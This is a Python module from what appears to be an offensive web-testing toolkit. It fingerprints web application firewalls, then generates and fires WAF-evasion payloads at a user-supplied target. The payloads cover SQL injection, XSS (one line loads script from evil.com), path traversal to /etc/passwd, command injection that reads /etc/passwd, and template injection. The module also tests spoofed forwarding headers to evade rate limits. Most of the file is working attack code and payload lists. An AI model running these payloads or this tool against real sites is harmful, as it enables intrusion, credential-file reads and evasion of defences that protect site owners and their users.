"""
modules/waf_bypass.py
tmrswrr - WAF Detection & Bypass Engine
Fingerprint WAF, generate bypass payloads, test evasion techniques
"""
import os
import re

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    BOLD,
    DIM,
    NEON_CYN,
    NEON_GRN,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    info,
    print_banner,
    prompt,
    run_and_print,
    run_cmd,
    section,
    success,
    warn,
)


def _out(name):
    d = str(OUTPUT_DIR); os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target():
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL"); SESSION["target_url"] = url
    return url


# WAF fingerprints - response header/body patterns
WAF_SIGNATURES = {
    "Cloudflare":      ["cloudflare", "cf-ray", "__cfduid", "cloudflare-nginx"],
    "AWS WAF":         ["aws waf", "x-amzn-requestid", "awselb"],
    "Akamai":          ["akamai", "akamaighost", "x-check-cacheable"],
    "ModSecurity":     ["mod_security", "modsecurity", "not acceptable"],
    "F5 BIG-IP ASM":   ["ts=", "f5-traf", "big-ip"],
    "Imperva Incapsula":["incapsula", "x-iinfo", "visid_incap"],
    "Sucuri":          ["sucuri", "x-sucuri-id", "access denied - sucuri"],
    "Barracuda":       ["barracuda", "barra_counter_session"],
    "SonicWall":       ["sonicwall", "sonicwall_sessionid"],
    "Fortinet":        ["fortigate", "forticare", "fortweb"],
    "Nginx WAF":       ["nginx", "x-ngx-", "openresty"],
    "Wallarm":         ["wallarm", "x-wallarm"],
    "StackPath":       ["stackpath", "sp-rid"],
    "Palo Alto":       ["pan-os", "panos"],
    "Radware":         ["radware", "x-sl-compstate"],
}


def detect_waf():
    section("WAF FINGERPRINTING")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-b "{cookies}"' if cookies else ""

    info("Detecting WAF via normal + malicious request analysis...")

    # Normal request
    normal_out, _, _ = run_cmd(f'curl -sk -I {cookie_flag} "{url}" -m 10')
    normal_lower = normal_out.lower()

    # Malicious request (triggers WAF)
    trigger_url = f"{url}?id=1' OR 1=1-- -&test=<script>alert(1)</script>"
    mal_out, _, rc = run_cmd(
        f'curl -sk -D - -o - {cookie_flag} "{trigger_url}" -m 10'
    )
    mal_lower = (normal_out + mal_out).lower()

    # Check HTTP codes
    normal_code = re.search(r"HTTP/\d+\.?\d*\s+(\d+)", normal_out)
    mal_code    = re.search(r"HTTP/\d+\.?\d*\s+(\d+)", mal_out)
    n_code = normal_code.group(1) if normal_code else "?"
    m_code = mal_code.group(1) if mal_code else "?"

    print(f"\n  {NEON_CYN}Normal request:{RST}     HTTP {n_code}")
    print(f"  {NEON_CYN}Malicious request:{RST}  HTTP {m_code}")

    if m_code in ("403", "406", "429", "503"):
        warn(f"WAF likely active - blocked malicious request (HTTP {m_code})")

    # Match signatures
    detected = []
    for waf_name, signatures in WAF_SIGNATURES.items():
        for sig in signatures:
            if sig.lower() in mal_lower:
                detected.append(waf_name)
                break

    if detected:
        for waf in detected:
            success(f"WAF Detected: {BOLD}{waf}{RST}")
            SESSION["_waf"] = waf
        save_session()
    else:
        info("No known WAF signatures detected - may be custom/undetected or no WAF")
        # Check wafw00f
        import shutil
        if shutil.which("wafw00f"):
            info("Running wafw00f for deeper detection...")
            run_and_print(f"wafw00f {url}", timeout=30)
        else:
            info("Install wafw00f: pip install wafw00f")

    return detected


def bypass_payloads():
    section("WAF BYPASS PAYLOAD GENERATOR")
    waf = SESSION.get("_waf", "Unknown")
    info(f"Detected WAF: {waf}")

    vuln_type = prompt(
        "Vulnerability type:\n  [1] SQLi  [2] XSS  [3] Path Traversal  [4] CMDi  [5] SSTI"
    )

    payloads = {
        "1": {  # SQLi
            "baseline": "' OR 1=1--",
            "bypasses": [
                # Case variation
                "' oR 1=1--",
                "' Or 1=1--",
                "' OR/**/ 1=1--",
                # Comment injection
                "' /*!OR*/ 1=1--",
                "' /*!50000OR*/ 1=1--",
                "/**/OR/**/1=1--",
                # URL encoding
                "%27%20OR%201%3D1--",
                "%27%20%4F%52%201%3D1--",
                # Double encoding
                "%2527%20OR%201%3D1--",
                # Whitespace bypass
                "'\t\nOR\t\n1=1--",
                "'+OR+1=1--",
                # HPP bypass
                "1&id=1' OR '1'='1",
                # Hex encoding
                "0x27 OR 1=1--",
                "' OR 0x31=0x31--",
                # Alternative syntax
                "' OR 'x'='x",
                "' OR 1 LIKE 1--",
                "' OR 2>1--",
                # Chunked
                "' O\0R 1=1--",
                "' %00OR 1=1--",
                # MySQL specific
                "' OR 1=1 LIMIT 1;#",
                "' ||  1=1--",
                # Unicode bypass
                "ʼ OR 1=1--",
            ]
        },
        "2": {  # XSS
            "baseline": "<script>alert(1)</script>",
            "bypasses": [
                # Tag variation
                "<ScRiPt>alert(1)</ScRiPt>",
                "<SCRIPT>alert(1)</SCRIPT>",
                # Events
                "<img src=x onerror=alert(1)>",
                "<img src=x onerror=alert`1`>",
                "<img src=x onerror=window['alert'](1)>",
                # Encoding
                "<scr\x00ipt>alert(1)</scr\x00ipt>",
                "<scr&#x69;pt>alert(1)</scr&#x69;pt>",
                "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
                # Event handlers
                "<body onload=alert(1)>",
                "<svg onload=alert(1)>",
                "<input autofocus onfocus=alert(1)>",
                "<marquee onstart=alert(1)>",
                # Protocol
                "<a href=javascript:alert(1)>click",
                "javascript:/*--></title></style></textarea>"
                "</script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
                # Filter bypass
                "<script/src=data:,alert(1)>",
                "<Script src=//evil.com/x.js>",
                # Template injection as XSS
                "{{constructor.constructor('alert(1)')()}}",
                "${alert(1)}",
            ]
        },
        "3": {  # Path traversal
            "baseline": "../../../etc/passwd",
            "bypasses": [
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%252F..%252F..%252Fetc%252Fpasswd",
                "..%c0%af..%c0%af..%c0%afetc/passwd",
                "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
                "....//....//....//etc/passwd",
                "..././../././../etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "/%5C../%5C../%5C../etc/passwd",
                "..\\..\\..\\etc\\passwd",
                "../%2F../etc/passwd",
                "/..%2F..%2F..%2Fetc%2Fpasswd",
            ]
        },
        "4": {  # Command injection
            "baseline": "; id",
            "bypasses": [
                ";${IFS}id",
                ";$IFS$9id",
                ";{id}",
                "|id",
                "||id",
                "`id`",
                "$(id)",
                ";i%64",
                "%0aid",
                "%0did",
                "$'\x69\x64'",
                ";/???/id",
                ";/usr/bin/id",
                ";c''at /etc/passwd",
                ";cat${IFS}/etc/passwd",
            ]
        },
        "5": {  # SSTI
            "baseline": "{{7*7}}",
            "bypasses": [
                "{{'7'*7}}",
                "{{7|e}}",
                "{% 7*7 %}",
                "${7*7}",
                "#{7*7}",
                "@{7*7}",
                "<%= 7*7 %>",
                "{#7*7#}",
                "${{'7'.__class__}}",
                "{{config.items()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
            ]
        }
    }

    if vuln_type not in payloads:
        warn("Invalid choice")
        return

    data = payloads[vuln_type]
    print(f"\n  {NEON_CYN}Baseline:{RST} {data['baseline']}")
    print(f"\n  {NEON_GRN}WAF Bypass Variants ({len(data['bypasses'])}):{RST}")
    for p in data["bypasses"]:
        print(f"  {PURE_WHITE}{p}{RST}")

    # Save to file
    out_file = _out(f"waf_bypass_payloads_{['sqli','xss','pathtraversal','cmdi','ssti'][int(vuln_type)-1]}.txt")
    with open(out_file, "w") as f:
        f.write("\n".join(data["bypasses"]))
    success(f"Saved {len(data['bypasses'])} payloads → {out_file}")

    # Test against target
    url = _target()
    if prompt(f"\nTest these payloads against {url}? [y/N]").lower() == "y":
        param = prompt("Parameter name to inject")
        if param:
            cookies = SESSION.get("cookies", "")
            cookie_flag = f'-b "{cookies}"' if cookies else ""
            info(f"Testing {len(data['bypasses'])} payloads...")
            import urllib.parse
            bypassed = []
            for p in data["bypasses"]:
                enc = urllib.parse.quote(p, safe="")
                sep = "&" if "?" in url else "?"
                test_url = f"{url}{sep}{param}={enc}"
                out, _, _ = run_cmd(f'curl -sk {cookie_flag} "{test_url}" -m 8 -w "\\nHTTP:%{{http_code}}"')
                code = re.search(r"HTTP:(\d+)", out)
                c = code.group(1) if code else "?"
                # Not blocked = bypass
                if c not in ("403", "406", "429"):
                    bypassed.append(p)
                    print(f"  {NEON_GRN}[PASS {c}]{RST} {p[:60]}")
                else:
                    print(f"  {DIM}[BLOCKED {c}]{RST} {p[:60]}")
            if bypassed:
                success(f"{len(bypassed)}/{len(data['bypasses'])} payloads bypassed WAF!")
                add_vuln("WAF Bypass", "High", "A05:2021",
                         f"{len(bypassed)} bypass variants not blocked", url)


def rate_limit_evasion():
    section("RATE LIMIT & IP EVASION")
    url = _target()
    cookies = SESSION.get("cookies", "")

    print(f"""
  {NEON_CYN}Techniques to bypass IP-based rate limiting:{RST}

  {NEON_GRN}[1] X-Forwarded-For rotation:{RST}
    Each request uses different spoofed IP
    curl -H "X-Forwarded-For: 1.2.3.4" {url}
    curl -H "X-Forwarded-For: 5.6.7.8" {url}

  {NEON_GRN}[2] Other bypass headers:{RST}
    X-Real-IP, X-Client-IP, X-Host, True-Client-IP
    CF-Connecting-IP, X-Originating-IP, X-Remote-Addr

  {NEON_GRN}[3] HTTP/2 multiplexing:{RST}
    Send multiple requests in parallel over single connection
    Harder to rate-limit per-request

  {NEON_GRN}[4] Slowloris / slow requests:{RST}
    Send partial requests to consume connections

  {NEON_CYN}Test headers:{RST}
""")

    bypass_headers = [
        "X-Forwarded-For: 127.0.0.1",
        "X-Real-IP: 127.0.0.1",
        "X-Client-IP: 127.0.0.1",
        "True-Client-IP: 127.0.0.1",
        "CF-Connecting-IP: 127.0.0.1",
        "X-Originating-IP: 127.0.0.1",
        "X-Remote-Addr: 127.0.0.1",
        "X-Host: localhost",
    ]

    cookie_flag = f'-b "{cookies}"' if cookies else ""
    for hdr in bypass_headers:
        out, _, _ = run_cmd(
            f'curl -sk -o /dev/null -w "%{{http_code}}" {cookie_flag} '
            f'-H "{hdr}" "{url}" -m 5'
        )
        code = out.strip()
        color = NEON_GRN if code == "200" else DIM
        print(f"  {color}[{code}]{RST} {hdr}")
        if code == "200":
            add_vuln("IP Spoofing via Header", "Medium", "A05:2021",
                     f"Rate limit bypass: {hdr}", url)


def run():
    print_banner("WAF DETECTION & BYPASS ENGINE", "tmrswrr")
    while True:
        url = SESSION.get("target_url", "-")
        waf = SESSION.get("_waf", "unknown")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}
  {NEON_GRN}WAF:{RST}    {PURE_WHITE}{waf}{RST}

  {NEON_CYN}[1]{RST} WAF Fingerprinting     {SOFT_WHITE}(14+ WAF signatures){RST}
  {NEON_CYN}[2]{RST} Bypass Payload Generator {SOFT_WHITE}(SQLi/XSS/Traversal/CMDi/SSTI){RST}
  {NEON_CYN}[3]{RST} Rate Limit Evasion     {SOFT_WHITE}(IP spoofing headers){RST}
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0": break
        elif c == "1": detect_waf()
        elif c == "2": bypass_payloads()
        elif c == "3": rate_limit_evasion()
        save_session()
